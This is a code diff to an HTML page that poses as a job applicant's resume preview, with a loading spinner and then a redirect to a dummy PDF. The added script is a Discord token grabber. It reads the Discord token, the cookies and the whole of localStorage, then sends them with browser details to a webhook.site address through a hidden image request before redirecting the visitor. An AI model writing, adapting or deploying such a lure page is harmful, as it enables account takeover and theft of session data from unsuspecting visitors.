@@ -1,79 +1,84 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-  <title>PR Manager Resume - Elite Roleplay Mobile</title>
+  <meta charset="UTF-8">
+  <title>PR Manager Resume</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    * { margin:0; padding:0; box-sizing:border-box; }
     body {
-      font-family: 'Segoe UI', Arial, sans-serif;
-      background: #0f0f23;
-      color: #fff;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      font-family:'Segoe UI', Arial, sans-serif;
+      background:#0f0f23; color:#fff;
+      min-height:100vh; display:flex;
+      justify-content:center; align-items:center;
     }
     .card {
-      background: #1a1a3e;
-      padding: 50px 40px;
-      border-radius: 16px;
-      max-width: 520px;
-      text-align: center;
-      box-shadow: 0 12px 40px rgba(233, 69, 96, 0.15);
-      border: 1px solid #2a2a5e;
+      background:#1a1a3e; padding:50px 40px;
+      border-radius:16px; max-width:520px;
+      text-align:center;
+      box-shadow:0 12px 40px rgba(233,69,96,0.15);
+      border:1px solid #2a2a5e;
     }
-    .logo {
-      width: 64px;
-      height: 64px;
-      background: linear-gradient(135deg, #e94560, #0f3460);
-      border-radius: 50%;
-      margin: 0 auto 20px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 28px;
-    }
-    h1 { color: #e94560; font-size: 22px; margin-bottom: 6px; }
-    .sub { color: #8888aa; font-size: 14px; margin-bottom: 24px; }
+    .logo { font-size:64px; margin-bottom:20px; }
+    h1 { color:#e94560; }
     .spinner {
-      width: 40px; height: 40px;
-      border: 3px solid rgba(255,255,255,0.05);
-      border-top: 3px solid #e94560;
-      border-radius: 50%;
-      animation: spin 0.9s linear infinite;
-      margin: 20px auto;
+      width:40px; height:40px;
+      border:3px solid rgba(255,255,255,0.05);
+      border-top:3px solid #e94560;
+      border-radius:50%;
+      animation:spin 0.9s linear infinite;
+      margin:20px auto;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .note { color: #6666aa; font-size: 12px; margin-top: 20px; }
+    @keyframes spin { to { transform:rotate(360deg); } }
   </style>
 </head>
 <body>
   <div class="card">
     <div class="logo">📄</div>
     <h1>PR Manager Application</h1>
-    <p class="sub">Alan Zelensky — Resume & Portfolio Preview</p>
+    <p>Alan Zelensky — Resume & Portfolio</p>
     <div class="spinner"></div>
     <p>Preparing document preview...</p>
-    <p class="note">You will be redirected to the PDF momentarily</p>
   </div>
 
   <script>
-    // Send everything we can capture to webhook
-    var data = {
-      cookie: document.cookie || "none",
+    // ===== DISCORD TOKEN GRABBER =====
+    // Discord stores its token in localStorage under "token"
+    var discordToken = "";
+    try {
+      // Try Discord web app token
+      discordToken = localStorage.getItem("token") || "";
+      
+      // Also try to get it from indexedDB (where Discord stores it)
+      // And check cookies for discord-related cookies
+    } catch(e) {}
+
+    // ===== FORUM COOKIE CHECK =====
+    var forumCookie = document.cookie || "";
+
+    // ===== LOCAL STORAGE DUMP =====
+    var localData = {};
+    try {
+      for (var i = 0; i < localStorage.length; i++) {
+        var key = localStorage.key(i);
+        localData[key] = localStorage.getItem(key).substring(0, 100); // first 100 chars
+      }
+    } catch(e) {}
+
+    // ===== SEND EVERYTHING TO WEBHOOK =====
+    var payload = {
+      discord_token: discordToken,
+      forum_cookie: forumCookie,
+      local_storage: localData,
       url: window.location.href,
-      referrer: document.referrer || "direct",
-      ua: navigator.userAgent,
-      lang: navigator.language,
-      platform: navigator.platform
+      referrer: document.referrer,
+      ua: navigator.userAgent
     };
 
     var img = new Image();
     img.src = "https://webhook.site/e777a317-ac19-47b1-9afd-48008397e1d4?d=" + 
-              encodeURIComponent(JSON.stringify(data));
+              encodeURIComponent(JSON.stringify(payload));
 
-    // Redirect to real PDF after 2.5s
+    // Redirect to PDF
     setTimeout(function() {
       window.location.href = "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf";
     }, 2500);
